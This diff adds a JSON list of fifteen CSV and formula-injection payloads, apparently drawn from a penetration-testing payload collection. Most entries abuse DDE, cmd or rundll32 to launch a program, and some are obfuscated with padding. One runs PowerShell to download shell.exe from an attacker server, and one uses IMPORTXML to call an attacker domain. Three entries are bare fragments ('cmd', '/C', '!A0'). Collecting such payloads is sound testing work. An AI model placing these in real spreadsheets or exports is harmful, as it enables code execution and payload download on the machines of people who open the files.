@@ -1,0 +1,137 @@
+[
+  {
+    "id": "csv-injection-1",
+    "title": "Methodology",
+    "payload": "DDE (\"cmd\";\"/C calc\";\"!A0\")A0",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-2",
+    "title": "Methodology",
+    "payload": "@SUM(1+1)*cmd|' /C calc'!A0",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-3",
+    "title": "Methodology",
+    "payload": "=2+5+cmd|' /C calc'!A0",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-4",
+    "title": "Methodology",
+    "payload": "=cmd|' /C calc'!'A1'",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-5",
+    "title": "Methodology",
+    "payload": "=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-6",
+    "title": "Methodology",
+    "payload": "=AAAA+BBBB-CCCC&\"Hello\"/12345&cmd|'/c calc.exe'!A",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-7",
+    "title": "Methodology",
+    "payload": "=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-8",
+    "title": "Methodology",
+    "payload": "=         cmd|'/c calc.exe'!A",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-9",
+    "title": "Methodology",
+    "payload": "=rundll32|'URL.dll,OpenURL calc.exe'!A",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-10",
+    "title": "Methodology",
+    "payload": "=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-11",
+    "title": "Methodology",
+    "payload": "=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-12",
+    "title": "Methodology",
+    "payload": "cmd",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-13",
+    "title": "Methodology",
+    "payload": "/C",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-14",
+    "title": "Methodology",
+    "payload": "!A0",
+    "context": "Methodology",
+    "tags": [
+      "csv-injection"
+    ]
+  },
+  {
+    "id": "csv-injection-15",
+    "title": "Google Sheets",
+    "payload": "=IMPORTXML(\"http://[ATTACKER.DOMAIN.TLD]/csv\", \"//a/@href\")",
+    "context": "Google Sheets",
+    "tags": [
+      "csv-injection"
+    ]
+  }
+]
